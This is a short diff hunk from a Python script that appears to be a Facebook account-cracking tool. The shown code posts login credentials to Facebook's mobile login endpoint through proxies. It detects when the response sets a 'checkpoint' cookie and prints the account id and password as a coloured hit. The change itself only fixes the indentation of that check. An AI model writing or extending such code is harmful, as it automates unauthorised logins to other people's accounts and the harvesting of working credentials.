@@ -288,7 +288,7 @@ def md1(idf,pwv):
       "accept-encoding": "gzip, deflate br",
       "accept-language": "fr-FR,fr;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}
       po = ses.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
-	    if "checkpoint" in po.cookies.get_dict().keys():
+      if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
          print(f'\r\x1b[38;5;208m [Asdel-Cp] {idf}|{pw}{xxx}')
